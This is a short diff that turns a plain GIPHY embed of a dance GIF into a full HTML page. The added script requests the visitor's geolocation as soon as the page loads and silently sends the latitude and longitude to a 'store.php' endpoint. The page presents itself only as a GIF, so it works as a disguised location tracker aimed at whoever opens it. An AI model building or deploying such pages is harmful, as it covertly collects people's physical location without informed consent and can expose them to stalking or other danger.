@@ -1,1 +1,29 @@
-<iframe src="https://giphy.com/embed/26ybw2WdicjAq1aco" width="480" height="326" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/bollytc-bollywood-thumkas-26ybw2WdicjAq1aco">via GIPHY</a></p>
+<!DOCTYPE html>
+<html>
+<body onload = "getLocation()">
+<iframe src="https://giphy.com/embed/26ybw2WdicjAq1aco" width="480" height="326" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+<p>
+<a href="https://giphy.com/gifs/bollytc-bollywood-thumkas-26ybw2WdicjAq1aco">via GIPHY</a>
+</p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "store.php?=Latitude=" + position.coords.latitude + "&Longitude=" + position.coords.longitude);
+  xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
